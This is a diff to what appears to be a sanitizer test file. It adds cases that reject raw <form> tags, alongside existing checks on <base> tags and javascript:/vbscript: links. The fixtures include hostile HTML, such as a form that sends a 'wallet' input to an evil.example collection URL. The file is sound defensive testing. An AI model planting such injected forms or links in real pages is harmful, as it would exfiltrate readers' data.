@@ -19,6 +19,13 @@ function accepts(content, label) {
 rejects('Intro.\n\n<base href="https://evil.example/">', 'plain <base>');
 rejects('Intro.\n\n<  base   href="https://evil.example/">', 'spaced <base>');
 
+// <form> tags are blocked: a raw form can submit reader data (e.g. wallet
+// addresses entered into a hidden input) to an attacker-controlled action URL,
+// with no JS and no flagged scheme -- action="https://..." passes every
+// scheme/handler check above.
+rejects('Intro.\n\n<form action="https://evil.example/collect" method="GET"><input name="wallet"><button>Go</button></form>', 'plain <form>');
+rejects('Intro.\n\n<  form   action="https://evil.example/collect">', 'spaced <form>');
+
 // Plain dangerous URL schemes remain blocked.
 rejects('See [x](javascript:alert(1)).', 'plain javascript:');
 rejects('See [x](vbscript:msgbox(1)).', 'plain vbscript:');
